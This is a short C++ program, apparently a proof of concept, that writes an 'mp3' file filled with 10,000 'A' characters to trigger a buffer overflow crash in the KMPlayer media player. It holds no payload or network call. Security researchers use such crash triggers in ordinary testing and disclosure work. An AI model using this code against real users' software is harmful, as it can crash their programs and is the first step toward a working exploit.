//File name: attack-kmplayer.cpp
#include <string>
#include <iostream>
#include <fstream>

using namespace std;

int main(int argc, char *argv[]) {
	string filename("vulnerable.mp3");
	string junk(10000, 'A');
	ofstream fout(filename.c_str(), ios::binary);
	fout << junk;
	
	cout << "OK: " << filename << "\n";
}
